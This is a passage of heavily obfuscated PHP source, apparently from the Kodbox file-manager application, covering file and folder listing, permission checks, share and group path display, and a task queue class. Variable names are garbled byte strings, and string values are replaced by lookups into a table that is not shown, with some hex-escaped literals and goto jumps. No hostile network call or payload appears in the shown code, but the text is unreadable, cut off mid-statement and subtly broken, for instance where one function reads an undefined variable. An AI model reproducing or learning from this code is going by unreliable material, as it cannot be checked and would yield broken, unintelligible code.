$›˜Õí˜[$Â¼şùÜ–[183]] = json_decode($›˜Õí˜[$Â¼şùÜ–[168]][$Â¼şùÜ–[183]], !0); unset($›˜Õí˜[$Â¼şùÜ–[168]][$Â¼şùÜ–[183]]); } } unset($›˜Õí˜); } protected function _listAppendSourceInfo(&$®·Ñºş, $ƒ˜¡Š”Û) { $©Åò›ıé =& $_SERVER[öæÛ¿©¿]; $Ï“Üîş‹ = Model($©Åò›ıé[561])->listData(); $€ñÌ›¼† = Model($©Åò›ıé[510])->listData(); $‡ñîÒ‚ó = Model($©Åò›ıé[500])->listData(); $´ñ°³´¾ = Model($©Åò›ıé[562])->listSimple(); $ÜÕİ–è† = array_to_keyvalue($Ï“Üîş‹, $©Åò›ıé[483]); $¡Úê«æ™ = array_to_keyvalue_group($€ñÌ›¼†, $©Åò›ıé[87], $©Åò›ıé[511]); $­¯¶© ¢ = array_to_keyvalue($‡ñîÒ‚ó, $©Åò›ıé[87]); $Õ’ÓÜªê = array_to_keyvalue_group($´ñ°³´¾, $©Åò›ıé[192]); foreach ($®·Ñºş as &$ÑÑ‰Õ’²) { $ÑÑ‰Õ’²[$©Åò›ıé[90]] = array($©Åò›ıé[563] => 0, $©Åò›ıé[564] => 0, $©Åò›ıé[565] => 0); if (isset($­¯¶© ¢[$ÑÑ‰Õ’²[$©Åò›ıé[192]]])) { $ÑÑ‰Õ’²[$©Åò›ıé[90]][$©Åò›ıé[566]] = 1; $ÑÑ‰Õ’²[$©Åò›ıé[90]][$©Åò›ıé[567]] = $­¯¶© ¢[$ÑÑ‰Õ’²[$©Åò›ıé[192]]][$©Åò›ıé[32]]; } if ($¡Úê«æ™ && $ÜÕİ–è† && isset($¡Úê«æ™[$ÑÑ‰Õ’²[$©Åò›ıé[192]]])) { $ÑÑ‰Õ’²[$©Åò›ıé[90]][$©Åò›ıé[568]] = array(); foreach ($¡Úê«æ™[$ÑÑ‰Õ’²[$©Åò›ıé[192]]] as $Çšø© ) { $úÂı™Ó¯ = $ÜÕİ–è†[$Çšø© ]; $ÑÑ‰Õ’²[$©Åò›ıé[90]][$©Åò›ıé[568]][] = array($©Åò›ıé[569] => $úÂı™Ó¯[$©Åò›ıé[483]], $©Åò›ıé[505] => $úÂı™Ó¯[$©Åò›ıé[32]], $©Åò›ıé[570] => $úÂı™Ó¯[$©Åò›ıé[571]]); } } if ($Õ’ÓÜªê && isset($Õ’ÓÜªê[$ÑÑ‰Õ’²[$©Åò›ıé[192]]])) { $ÑÑ‰Õ’²[$©Åò›ıé[90]][$©Åò›ıé[572]] = array(); foreach ($Õ’ÓÜªê[$ÑÑ‰Õ’²[$©Åò›ıé[192]]] as $Ö á°úİ) { $ÑÑ‰Õ’²[$©Åò›ıé[90]][$©Åò›ıé[572]] = $this->shareFilterShow($Ö á°úİ); } } } unset($ÑÑ‰Õ’²); return $®·Ñºş; } protected function shareFilterShow($«’¨¥³) { $¾æàºûğ =& $_SERVER[öæÛ¿©¿]; if (!$«’¨¥³) { return $«’¨¥³; } $ˆßŞÔ¹û = $¾æàºûğ[573]; if ($«’¨¥³[$¾æàºûğ[574]] == $¾æàºûğ[91]) { $ˆßŞÔ¹û .= $¾æàºûğ[575]; } if (is_array($«’¨¥³[$¾æàºûğ[576]]) && is_array($«’¨¥³[$¾æàºûğ[576]][$¾æàºûğ[577]])) { $«’¨¥³[$¾æàºûğ[576]][$¾æàºûğ[577]] = $¾æàºûğ[578]; } if (!$²Íº€šå[$¾æàºûğ[579]] && $²Íº€šå[$¾æàºûğ[192]] != $¾æàºûğ[229]) { $²Íº€šå[$¾æàºûğ[579]] = KodIO::make($²Íº€šå[$¾æàºûğ[192]]); } $«’¨¥³ = array_field_key($«’¨¥³, explode($¾æàºûğ[50], $ˆßŞÔ¹û)); return $«’¨¥³; } protected function _listAppendChildren(&$Œœ¶Æ‚, $êŸ³ìıƒ) { $Ÿéƒ«“¦ =& $_SERVER[öæÛ¿©¿]; $‚×±üÇ = array(); $šı“›³‡ = array($Ÿéƒ«“¦[240] => 0, $Ÿéƒ«“¦[241] => 0); foreach ($Œœ¶Æ‚ as &$ò‰òóÑ°) { if (!$ò‰òóÑ°[$Ÿéƒ«“¦[496]]) { continue; } $‚×±üÇ[] = intval($ò‰òóÑ°[$Ÿéƒ«“¦[192]]); } unset($ò‰òóÑ°); if (!$‚×±üÇ) { return; } $Ú”¥å°¹ = array($Ÿéƒ«“¦[191] => array($Ÿéƒ«“¦[7], $‚×±üÇ), $Ÿéƒ«“¦[516] => 0); $æ¼÷Ó˜À = array($Ÿéƒ«“¦[191], $Ÿéƒ«“¦[496], $Ÿéƒ«“¦[580] => $Ÿéƒ«“¦[581]); $€Ğ’˜ê = $this->field($æ¼÷Ó˜À)->where($Ú”¥å°¹)->group($Ÿéƒ«“¦[582])->select(); $à¥‡ØŒ… = array(); foreach ($€Ğ’˜ê as $¹Á¼²Ùß) { $·»¡é½ = $¹Á¼²Ùß[$Ÿéƒ«“¦[191]]; $şøî¸Ö€ = $¹Á¼²Ùß[$Ÿéƒ«“¦[496]] == $Ÿéƒ«“¦[91] ? $Ÿéƒ«“¦[241] : $Ÿéƒ«“¦[240]; if (!isset($à¥‡ØŒ…[$·»¡é½])) { $à¥‡ØŒ…[$·»¡é½] = array($Ÿéƒ«“¦[240] => 0, $Ÿéƒ«“¦[241] => 0); } $à¥‡ØŒ…[$·»¡é½][$şøî¸Ö€] += $¹Á¼²Ùß[$Ÿéƒ«“¦[581]]; } foreach ($Œœ¶Æ‚ as &$ò‰òóÑ°) { if (!$ò‰òóÑ°[$Ÿéƒ«“¦[496]]) { continue; } $şĞòÁ¯× = is_array($à¥‡ØŒ…[$ò‰òóÑ°[$Ÿéƒ«“¦[192]]]) ? $à¥‡ØŒ…[$ò‰òóÑ°[$Ÿéƒ«“¦[192]]] : $šı“›³‡; $ò‰òóÑ°[$Ÿéƒ«“¦[241]] = $şĞòÁ¯×[$Ÿéƒ«“¦[241]]; $ò‰òóÑ°[$Ÿéƒ«“¦[240]] = $şĞòÁ¯×[$Ÿéƒ«“¦[240]]; unset($ò‰òóÑ°[$Ÿéƒ«“¦[497]]); } unset($ò‰òóÑ°); } protected function _listAppendAuth(&$Ì²¤¤µí) { $™§Øú°— =& $_SERVER[öæÛ¿©¿]; $õÆÆ’“¨ = array(); foreach ($Ì²¤¤µí as $×îùİÆï) { if ($×îùİÆï[$™§Øú°—[189]] == self::TYPE_GROUP) { $õÆÆ’“¨[] = intval($×îùİÆï[$™§Øú°—[192]]); } } if (!$õÆÆ’“¨) { return; } $ˆë¬ıƒÄ = array_to_keyvalue($Ì²¤¤µí, $™§Øú°—[192]); $‘şÊ¯©™ = Model($™§Øú°—[583])->getSourceList($õÆÆ’“¨, $ˆë¬ıƒÄ); $¨Ã¸±İ = KodUser::isRoot(); foreach ($Ì²¤¤µí as $™¦íÁ“ö => &$×îùİÆï) { $×îùİÆï[$™§Øú°—[498]] = $‘şÊ¯©™[$×îùİÆï[$™§Øú°—[192]]]; if (!$×îùİÆï[$™§Øú°—[498]] && $×îùİÆï[$™§Øú°—[189]] == self::TYPE_GROUP) { $×îùİÆï[$™§Øú°—[498]] = Action($™§Øú°—[584])->pathGroupAuthMake($×îùİÆï[$™§Øú°—[585]]); if (!$×îùİÆï[$™§Øú°—[498]] && !$¨Ã¸±İ) { $×îùİÆï[$™§Øú°—[234]] = !1; $×îùİÆï[$™§Øú°—[233]] = !1; } } if ($×îùİÆï[$™§Øú°—[498]]) { $×îùİÆï[$™§Øú°—[234]] = AuthModel::authCheckEdit($×îùİÆï[$™§Øú°—[498]][$™§Øú°—[499]]); $×îùİÆï[$™§Øú°—[233]] = AuthModel::authCheckView($×îùİÆï[$™§Øú°—[498]][$™§Øú°—[499]]); } $this->groupPathDisplay($×îùİÆï); } unset($×îùİÆï); } public function _listAppendAuthSecret(&$óŠğÈæ¸) { $Äûî—Ä =& $_SERVER[öæÛ¿©¿]; if (Model($Äûî—Ä[518])->get($Äûî—Ä[586]) != $Äûî—Ä[91]) { return; } static $’ÙğÙ˜ = false; if (!$’ÙğÙ˜) { $†ïì›Ú = Model($Äûî—Ä[587]); $ò›×æ¢è = Model($Äûî—Ä[588]); $’ÙğÙ˜ = $ò›×æ¢è->listData(); $’ÙğÙ˜ = array_to_keyvalue($’ÙğÙ˜, $Äûî—Ä[192]); $É‹—´şğ = json_decode(Model($Äûî—Ä[518])->get($Äûî—Ä[589]), !0); $É‹—´şğ = array_to_keyvalue($É‹—´şğ, $Äûî—Ä[483]); foreach ($’ÙğÙ˜ as $€…‚„÷ => $¿ŸÎ«¡¶) { $ıâ‘ıç = $É‹—´şğ[$¿ŸÎ«¡¶[$Äûî—Ä[590]]]; if (!$ıâ‘ıç) { $ò›×æ¢è->remove($¿ŸÎ«¡¶[$Äûî—Ä[483]]); unset($’ÙğÙ˜[$€…‚„÷]); continue; } $Ó”…ñ– = $†ïì›Ú->listData($ıâ‘ıç[$Äûî—Ä[498]]); if (!$Ó”…ñ–) { $ò›×æ¢è->remove($¿ŸÎ«¡¶[$Äûî—Ä[483]]); unset($’ÙğÙ˜[$€…‚„÷]); continue; } $¿ŸÎ«¡¶[$Äûî—Ä[498]] = $Ó”…ñ–; $¿ŸÎ«¡¶[$Äûî—Ä[591]] = $ıâ‘ıç; $¿ŸÎ«¡¶[$Äûî—Ä[592]] = Model($Äûî—Ä[593])->getInfoSimpleOuter($¿ŸÎ«¡¶[$Äûî—Ä[537]]); $’ÙğÙ˜[$€…‚„÷] = $¿ŸÎ«¡¶; } } $ãäùĞÀó = USER_ID; $¬ÁÒÁ¦÷ = array(); $·€†À§± = $this->_listAppendPath($¬ÁÒÁ¦÷, !0); foreach ($óŠğÈæ¸ as $€…‚„÷ => &$¿ŸÎ«¡¶) { if (!is_array($¿ŸÎ«¡¶[$Äûî—Ä[498]])) { continue; } if ($¿ŸÎ«¡¶[$Äûî—Ä[189]] != $Äûî—Ä[594]) { continue; } if (isset($’ÙğÙ˜[$¿ŸÎ«¡¶[$Äûî—Ä[192]]])) { $€Åşô¢© = $’ÙğÙ˜[$¿ŸÎ«¡¶[$Äûî—Ä[192]]]; if (!is_array($¿ŸÎ«¡¶[$Äûî—Ä[551]])) { $¿ŸÎ«¡¶[$Äûî—Ä[551]] = array(); } $¿ŸÎ«¡¶[$Äûî—Ä[551]][$Äûî—Ä[595]] = $€Åşô¢©[$Äûî—Ä[590]]; $¿ŸÎ«¡¶[$Äûî—Ä[498]][$Äûî—Ä[596]] = $€Åşô¢©; $¿ŸÎ«¡¶[$Äûî—Ä[498]][$Äûî—Ä[597]] = $¿ŸÎ«¡¶[$Äûî—Ä[598]]; $¿ŸÎ«¡¶[$Äûî—Ä[498]][$Äûî—Ä[599]] = $Äûî—Ä[91]; if ($€Åşô¢©[$Äûî—Ä[537]] != $ãäùĞÀó) { $¿ŸÎ«¡¶[$Äûî—Ä[498]][$Äûî—Ä[499]] = $¿ŸÎ«¡¶[$Äûî—Ä[498]][$Äûî—Ä[499]] & $€Åşô¢©[$Äûî—Ä[498]][$Äûî—Ä[498]]; } continue; } $È×“ĞüÉ = $this->parentLevelArray($¿ŸÎ«¡¶[$Äûî—Ä[600]]); $şù³‰‘‹ = array_reverse($È×“ĞüÉ); foreach ($şù³‰‘‹ as $ú £İ» => $üúØÃ ) { if (!isset($’ÙğÙ˜[$üúØÃ ])) { continue; } $€Åşô¢© = $’ÙğÙ˜[$üúØÃ ]; $¿ŸÎ«¡¶[$Äûî—Ä[498]][$Äûî—Ä[596]] = $€Åşô¢©; if ($€Åşô¢©[$Äûî—Ä[537]] != $ãäùĞÀó) { $¿ŸÎ«¡¶[$Äûî—Ä[498]][$Äûî—Ä[499]] = $¿ŸÎ«¡¶[$Äûî—Ä[498]][$Äûî—Ä[499]] & $€Åşô¢©[$Äûî—Ä[498]][$Äûî—Ä[498]]; } $ç¨÷Ó”· = $Äûî—Ä[12]; $ïôŸş¤Ø = count($È×“ĞüÉ) - $ú £İ»; for ($ääŸÚùË = 0; $ääŸÚùË < $ïôŸş¤Ø; $ääŸÚùË++) { if (!isset($·€†À§±[$È×“ĞüÉ[$ääŸÚùË]])) { $ç¨÷Ó”· = $Äûî—Ä[12]; break; } $ç¨÷Ó”· = $ç¨÷Ó”· . rtrim($·€†À§±[$È×“ĞüÉ[$ääŸÚùË]], $Äûî—Ä[8]) . $Äûî—Ä[8]; } $¿ŸÎ«¡¶[$Äûî—Ä[498]][$Äûî—Ä[597]] = rtrim($ç¨÷Ó”·, $Äûî—Ä[8]) . $Äûî—Ä[8]; break; } } unset($¿ŸÎ«¡¶); } public function groupPathDisplay(&$ßäÑ†Ù¾) { $À–·ã½¶ =& $_SERVER[öæÛ¿©¿]; if ($ßäÑ†Ù¾[$À–·ã½¶[189]] != self::TYPE_GROUP) { return; } $”™úªğó = Model($À–·ã½¶[601])->getInfo($ßäÑ†Ù¾[$À–·ã½¶[585]]); $ÔÃ¦ô‰» = $this->parentLevelArray($”™úªğó[$À–·ã½¶[600]]); $ìØ‘‰ÌĞ = $À–·ã½¶[12]; foreach ($ÔÃ¦ô‰» as $ğİ‘ºì) { $³áÛ²»ó = Model($À–·ã½¶[601])->getInfo($ğİ‘ºì); $ìØ‘‰ÌĞ .= $³áÛ²»ó[$À–·ã½¶[90]][$À–·ã½¶[192]] . $À–·ã½¶[50]; } $ßäÑ†Ù¾[$À–·ã½¶[602]] = $”™úªğó[$À–·ã½¶[191]]; $ßäÑ†Ù¾[$À–·ã½¶[603]] = $”™úªğó[$À–·ã½¶[600]]; $ßäÑ†Ù¾[$À–·ã½¶[604]] = $”™úªğó[$À–·ã½¶[605]]; $ßäÑ†Ù¾[$À–·ã½¶[606]] = $ìØ‘‰ÌĞ . $”™úªğó[$À–·ã½¶[90]][$À–·ã½¶[192]]; } protected function _listAppendPath(&$¬‹ñ•€¦, $¼Ùß‡²‰ = false) { $¢ÎÊ· =& $_SERVER[öæÛ¿©¿]; static $»³ğ€¡® = array(); $İÆƒÜûğ = array(); $˜Í†Ç½ë = array(); if ($¼Ùß‡²‰) { return $»³ğ€¡®; } foreach ($¬‹ñ•€¦ as &$©—´ñÃ) { $ï„€ÓˆÂ = $©—´ñÃ[$¢ÎÊ·[192]]; if ($©—´ñÃ[$¢ÎÊ·[496]] == $¢ÎÊ·[91] && $©—´ñÃ[$¢ÎÊ·[191]] != 0) { $»³ğ€¡®[$ï„€ÓˆÂ] = $©—´ñÃ[$¢ÎÊ·[32]]; } if ($©—´ñÃ[$¢ÎÊ·[496]] == $¢ÎÊ·[91] && $©—´ñÃ[$¢ÎÊ·[191]] == 0) { $»³ğ€¡®[$ï„€ÓˆÂ] = $this->_listAppendPathRoot($©—´ñÃ, array()); } if (isset($˜Í†Ç½ë[$©—´ñÃ[$¢ÎÊ·[600]]])) { continue; } $˜Í†Ç½ë[$©—´ñÃ[$¢ÎÊ·[600]]] = !0; $ú‚§¾÷ç = $this->parentLevelArray($©—´ñÃ[$¢ÎÊ·[600]]); foreach ($ú‚§¾÷ç as $¨Ïı¼İè => $Æ˜§™ú) { if (isset($»³ğ€¡®[$Æ˜§™ú])) { continue; } if ($¨Ïı¼İè == 0) { $»³ğ€¡®[$Æ˜§™ú] = $this->_listAppendPathRoot($©—´ñÃ, $ú‚§¾÷ç); } if ($¨Ïı¼İè != 0) { $İÆƒÜûğ[] = $Æ˜§™ú; } } } unset($©—´ñÃ); $İÆƒÜûğ = array_unique($İÆƒÜûğ); if (count($İÆƒÜûğ) > 0) { $ÇîÉ›±§ = array($¢ÎÊ·[502] => array($¢ÎÊ·[503], $İÆƒÜûğ)); if (count($İÆƒÜûğ) == 1) { $’š×µ˜ = $this->sourceInfo($İÆƒÜûğ[0]); $œˆç‡íæ = is_array($’š×µ˜) ? array($’š×µ˜) : !1; } else { $œˆç‡íæ = $this->field($¢ÎÊ·[607])->where($ÇîÉ›±§)->select(); } if (!$œˆç‡íæ) { $œˆç‡íæ = array(); } foreach ($œˆç‡íæ as $“œÌëê¾) { $»³ğ€¡®[$“œÌëê¾[$¢ÎÊ·[192]]] = $“œÌëê¾[$¢ÎÊ·[32]]; } } $ÙİÑË¦ê = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $›ø“‘ŒÂ = array(); foreach ($¬‹ñ•€¦ as &$©—´ñÃ) { $Æá€‰æ = $©—´ñÃ[$¢ÎÊ·[600]]; $ûæŠ·­• = $¢ÎÊ·[12]; if (isset($›ø“‘ŒÂ[$Æá€‰æ])) { $ûæŠ·­• = $›ø“‘ŒÂ[$Æá€‰æ]; } else { $ú‚§¾÷ç = $this->parentLevelArray($©—´ñÃ[$¢ÎÊ·[600]]); foreach ($ú‚§¾÷ç as $¨Ïı¼İè => $Æ˜§™ú) { if (isset($»³ğ€¡®[$Æ˜§™ú])) { $ûæŠ·­• .= $»³ğ€¡®[$Æ˜§™ú] . $¢ÎÊ·[8]; } } $›ø“‘ŒÂ[$Æá€‰æ] = $ûæŠ·­•; } $ûæŠ·­• .= $©—´ñÃ[$¢ÎÊ·[32]]; if ($©—´ñÃ[$¢ÎÊ·[496]] == $¢ÎÊ·[91]) { $ûæŠ·­• .= $¢ÎÊ·[8]; } $©—´ñÃ[$¢ÎÊ·[598]] = str_replace($¢ÎÊ·[255], $¢ÎÊ·[8], $ûæŠ·­•); if ($©—´ñÃ[$¢ÎÊ·[191]] == $¢ÎÊ·[229]) { $©—´ñÃ[$¢ÎÊ·[32]] = trim($»³ğ€¡®[$©—´ñÃ[$¢ÎÊ·[192]]], $¢ÎÊ·[8]); $©—´ñÃ[$¢ÎÊ·[598]] = $©—´ñÃ[$¢ÎÊ·[32]] . $¢ÎÊ·[8]; } if (intval($©—´ñÃ[$¢ÎÊ·[189]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($©—´ñÃ, $ú‚§¾÷ç, $ÙİÑË¦ê); } } unset($©—´ñÃ); return $¬‹ñ•€¦; } private function _listAppendPathRecycle(&$É„Š¹˜¬, $İ†ôÀ“ú, $¯¿­Ñã½) { $ÌçÚ‚ÓÖ =& $_SERVER[öæÛ¿©¿]; if (!in_array($¯¿­Ñã½, $İ†ôÀ“ú) && $É„Š¹˜¬[$ÌçÚ‚ÓÖ[192]] != $¯¿­Ñã½) { return; } $ÊÁ²¯õÉ = explode($ÌçÚ‚ÓÖ[8], trim($É„Š¹˜¬[$ÌçÚ‚ÓÖ[598]], $ÌçÚ‚ÓÖ[8])); $¡­Ê¼î = implode($ÌçÚ‚ÓÖ[8], array_slice($ÊÁ²¯õÉ, 2)); $É„Š¹˜¬[$ÌçÚ‚ÓÖ[598]] = $ÌçÚ‚ÓÖ[8] . LNG($ÌçÚ‚ÓÖ[608]) . $ÌçÚ‚ÓÖ[8] . ltrim($¡­Ê¼î, $ÌçÚ‚ÓÖ[8]); $É„Š¹˜¬[$ÌçÚ‚ÓÖ[600]] = $ÌçÚ‚ÓÖ[609] . implode($ÌçÚ‚ÓÖ[50], array_slice($İ†ôÀ“ú, 1)) . $ÌçÚ‚ÓÖ[50]; if ($É„Š¹˜¬[$ÌçÚ‚ÓÖ[192]] == $¯¿­Ñã½) { $É„Š¹˜¬[$ÌçÚ‚ÓÖ[600]] = $ÌçÚ‚ÓÖ[609]; $É„Š¹˜¬[$ÌçÚ‚ÓÖ[191]] = $ÌçÚ‚ÓÖ[229]; $É„Š¹˜¬[$ÌçÚ‚ÓÖ[32]] = LNG($ÌçÚ‚ÓÖ[608]); } $É„Š¹˜¬[$ÌçÚ‚ÓÖ[610]] = $ÌçÚ‚ÓÖ[611]; } protected function _listAppendPathRoot(&$¢ÕÕæ…Ø, $äú‘¨µ) { $ñÏÈôşŸ =& $_SERVER[öæÛ¿©¿]; static $Û‚É‘‡Å = false; static $¿îŠó‹ƒ = false; $óÈçêıÂ = $ñÏÈôşŸ[12]; if ($¢ÕÕæ…Ø[$ñÏÈôşŸ[189]] == self::TYPE_USER) { if ($¢ÕÕæ…Ø[$ñÏÈôşŸ[585]] == USER_ID) { $óÈçêıÂ = LNG($ñÏÈôşŸ[612]); if ($Û‚É‘‡Å === !1) { $ºŸãüÂ­ = Model($ñÏÈôşŸ[613])->getInfoFull(USER_ID); $Û‚É‘‡Å = _get($ºŸãüÂ­, $ñÏÈôşŸ[614], $ñÏÈôşŸ[12]); } if ($¿îŠó‹ƒ === !1) { $ºŸãüÂ­ = Model($ñÏÈôşŸ[613])->getInfoFull(USER_ID); $¿îŠó‹ƒ = _get($ºŸãüÂ­, $ñÏÈôşŸ[615], $ñÏÈôşŸ[12]); } if ($äú‘¨µ && $äú‘¨µ[0] == $Û‚É‘‡Å || !$äú‘¨µ && $¢ÕÕæ…Ø[$ñÏÈôşŸ[192]] == $Û‚É‘‡Å) { $óÈçêıÂ = LNG($ñÏÈôşŸ[616]); $¢ÕÕæ…Ø[$ñÏÈôşŸ[617]] = $ñÏÈôşŸ[618]; } if ($äú‘¨µ && $äú‘¨µ[0] == $¿îŠó‹ƒ || !$äú‘¨µ && $¢ÕÕæ…Ø[$ñÏÈôşŸ[192]] == $¿îŠó‹ƒ) { $óÈçêıÂ = $óÈçêıÂ . $ñÏÈôşŸ[619] . LNG($ñÏÈôşŸ[620]); } if (!$äú‘¨µ) { $¢ÕÕæ…Ø[$ñÏÈôşŸ[32]] = $óÈçêıÂ; } } else { $ºŸãüÂ­ = Model($ñÏÈôşŸ[613])->getInfoFull($¢ÕÕæ…Ø[$ñÏÈôşŸ[585]]); $ºŸ‡Š¢á = _get($ºŸãüÂ­, $ñÏÈôşŸ[615], $ñÏÈôşŸ[12]); $¢ÕÕæ…Ø[$ñÏÈôşŸ[621]] = Model($ñÏÈôşŸ[593])->getInfoSimpleOuter($¢ÕÕæ…Ø[$ñÏÈôşŸ[585]]); $óÈçêıÂ = LNG($ñÏÈôşŸ[622]) . $ñÏÈôşŸ[174] . $¢ÕÕæ…Ø[$ñÏÈôşŸ[621]][$ñÏÈôşŸ[32]] . $ñÏÈôşŸ[176]; if ($äú‘¨µ && $äú‘¨µ[0] == $ºŸ‡Š¢á || !$äú‘¨µ && $¢ÕÕæ…Ø[$ñÏÈôşŸ[192]] == $ºŸ‡Š¢á) { $óÈçêıÂ = LNG($ñÏÈôşŸ[622]) . $ñÏÈôşŸ[623] . $¢ÕÕæ…Ø[$ñÏÈôşŸ[621]][$ñÏÈôşŸ[32]] . $ñÏÈôşŸ[619] . LNG($ñÏÈôşŸ[620]) . $ñÏÈôşŸ[176]; } } } else { if ($¢ÕÕæ…Ø[$ñÏÈôşŸ[189]] == self::TYPE_GROUP) { $›ê€ãÁÚ = Model($ñÏÈôşŸ[601])->getInfoSimple($¢ÕÕæ…Ø[$ñÏÈôşŸ[585]]); $óÈçêıÂ = $›ê€ãÁÚ[$ñÏÈôşŸ[32]]; } else { if ($¢ÕÕæ…Ø[$ñÏÈôşŸ[189]] == self::TYPE_SYSTEM) { $óÈçêıÂ = $ñÏÈôşŸ[624]; } } } $óÈçêıÂ = $óÈçêıÂ ? $ñÏÈôşŸ[8] . $óÈçêıÂ . $ñÏÈôşŸ[8] : $ñÏÈôşŸ[8]; return $óÈçêıÂ; } protected function _listAppendUser(&$ÙŒƒŞÍ‹) { $©ú ºá® =& $_SERVER[öæÛ¿©¿]; $ß¡ÚÙ­ = array_to_keyvalue($ÙŒƒŞÍ‹, $©ú ºá®[12], $©ú ºá®[537]); $³¼¿‹˜˜ = array_to_keyvalue($ÙŒƒŞÍ‹, $©ú ºá®[12], $©ú ºá®[539]); $øÖ—ØˆÍ = array_merge($ß¡ÚÙ­, $³¼¿‹˜˜); $ÉöŸ·¾Æ = Model($©ú ºá®[613])->userListInfo($øÖ—ØˆÍ); foreach ($ÙŒƒŞÍ‹ as &$¦ïµ¬ÎÓ) { $†™•Ü‚ = $¦ïµ¬ÎÓ[$©ú ºá®[537]]; $¦ïµ¬ÎÓ[$©ú ºá®[537]] = $ÉöŸ·¾Æ[$†™•Ü‚] ? $ÉöŸ·¾Æ[$†™•Ü‚] : !1; $†™•Ü‚ = $¦ïµ¬ÎÓ[$©ú ºá®[539]]; $¦ïµ¬ÎÓ[$©ú ºá®[539]] = $ÉöŸ·¾Æ[$†™•Ü‚] ? $ÉöŸ·¾Æ[$†™•Ü‚] : !1; if (_get($¦ïµ¬ÎÓ, $©ú ºá®[625], 0)) { $Íà¾©ı = $GLOBALS[$©ú ºá®[6]][$©ú ºá®[92]][$©ú ºá®[626]]; if ($¦ïµ¬ÎÓ[$©ú ºá®[551]][$©ú ºá®[627]] <= time() - $Íà¾©ı) { $this->metaSet($¦ïµ¬ÎÓ[$©ú ºá®[192]], $©ú ºá®[628], null); $this->metaSet($¦ïµ¬ÎÓ[$©ú ºá®[192]], $©ú ºá®[627], null); unset($¦ïµ¬ÎÓ[$©ú ºá®[551]][$©ú ºá®[628]]); continue; } $ÎêÈËÊÍ = $¦ïµ¬ÎÓ[$©ú ºá®[551]][$©ú ºá®[628]]; $¦ïµ¬ÎÓ[$©ú ºá®[551]][$©ú ºá®[629]] = Model($©ú ºá®[613])->getInfoSimpleOuter($ÎêÈËÊÍ); } } unset($¦ïµ¬ÎÓ); } public function parentLevelArray($áì¯»ë) { $­ô‘£½ =& $_SERVER[öæÛ¿©¿]; $áì¯»ë = explode($­ô‘£½[50], trim($áì¯»ë, $­ô‘£½[50])); return array_to_int(array_filter($áì¯»ë)); } public function listAll($œÈˆâÍ×) { $óâçğ‰î =& $_SERVER[öæÛ¿©¿]; $‰ÄâÍ¦ = $this->sourceInfo($œÈˆâÍ×); $ÕäÆšÑ¸ = array($óâçğ‰î[630] => array($óâçğ‰î[631], $‰ÄâÍ¦[$óâçğ‰î[600]] . $œÈˆâÍ× . $óâçğ‰î[632]), $óâçğ‰î[633] => 0); $•Ñ®¼« = $óâçğ‰î[634]; $›Ê„èàá = "\x4c\x45\106\x54\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\x69\x6f\x5f\146\x69\x6c\145\x20\146\151\x6c\x65\x20\x6f\x6e\40\x73\157\x75\162\x63\145\x2e\x66\x69\154\x65\x49\104\40\75\40\146\x69\154\145\x2e\146\151\x6c\145\x49\104"; $æñéš­ì = $this->alias($óâçğ‰î[529])->field($•Ñ®¼«)->where($ÕäÆšÑ¸)->join($›Ê„èàá)->select(); $this->_listAppendAuth($æñéš­ì); $this->_listAppendUser($æñéš­ì); $this->_listAppendPath($æñéš­ì); $æñéš­ì = array_to_keyvalue($æñéš­ì, $óâçğ‰î[192]); $ Ë“æ· = "\x2f{$‰ÄâÍ¦[$óâçğ‰î[32]]}\57"; $ Ë“æ· = $ Ë“æ· == $óâçğ‰î[255] ? $óâçğ‰î[8] : $ Ë“æ·; $Üº”øşÊ = array(); foreach ($æñéš­ì as $¨¹Šõë¶ => $˜á†‘§«) { $Šæ¢Ñ¯… = $this->parentLevelArray($˜á†‘§«[$óâçğ‰î[600]]); array_shift($Šæ¢Ñ¯…); $Ü´èüÒş = $ Ë“æ·; for ($íê¦Ï = 0; $íê¦Ï < count($Šæ¢Ñ¯…); $íê¦Ï++) { $Ü´èüÒş .= $æñéš­ì[$Šæ¢Ñ¯…[$íê¦Ï]][$óâçğ‰î[32]] . $óâçğ‰î[8]; } $Ü´èüÒş .= $˜á†‘§«[$óâçğ‰î[32]]; if ($˜á†‘§«[$óâçğ‰î[496]]) { $Ü´èüÒş .= $óâçğ‰î[8]; } $»·¿×ÈŞ = array($óâçğ‰î[506] => str_replace($óâçğ‰î[255], $óâçğ‰î[8], str_replace($óâçğ‰î[255], $óâçğ‰î[8], str_replace($óâçğ‰î[255], $óâçğ‰î[8], $Ü´èüÒş))), $óâçğ‰î[635] => intval($˜á†‘§«[$óâçğ‰î[496]]), $óâçğ‰î[636] => intval($˜á†‘§«[$óâçğ‰î[79]]), $óâçğ‰î[88] => intval($˜á†‘§«[$óâçğ‰î[88]]), $óâçğ‰î[90] => $this->pathInfoFilter($˜á†‘§«)); if (!$»·¿×ÈŞ[$óâçğ‰î[496]]) { $»·¿×ÈŞ[$óâçğ‰î[553]] = $˜á†‘§«[$óâçğ‰î[553]]; } $Üº”øşÊ[] = $»·¿×ÈŞ; } $Üº”øşÊ = array_sort_by($Üº”øşÊ, $óâçğ‰î[87]); return $Üº”øşÊ; } } goto d‘ÃŞÎÁéê; fË’ø¶‘: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\x51\x75\145\165\x65\x4c\145\x6e\x67\x74\150"; const QUEUE_DATA = "\164\141\x73\x6b\121\165\x65\165\x65\104\x61\164\x61"; const QUEUE_TIME = "\164\141\x73\153\x51\165\x65\165\145\x4c\x61\163\x74\122\165\156"; const QUEUE_THREAD = "\x74\x61\x73\x6b\121\x75\145\x75\145\124\150\162\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($—ğ¯ƒæ, $¶œ³‰øÓ = array(), $­Õµ³™ = '', $±ËŠŠá¢ = '') { $™Ğı‡á÷ =& $_SERVER[öæÛ¿©¿]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($±ËŠŠá¢ && array_find_by_field(self::$listData, $™Ğı‡á÷[95], $±ËŠŠá¢)) { return !0; } if ($±ËŠŠá¢ && array_find_by_field(self::$listDataAdd, $™Ğı‡á÷[95], $±ËŠŠá¢)) { return !0; } self::$listDataAdd[] = array($™Ğı‡á÷[343] => $—ğ¯ƒæ, $™Ğı‡á÷[2033] => $¶œ³‰øÓ, $™Ğı‡á÷[536] => $­Õµ³™, $™Ğı‡á÷[95] => $±ËŠŠá¢); return !0; } public static function addSubmit() { $•Ò‚ş”¨ =& 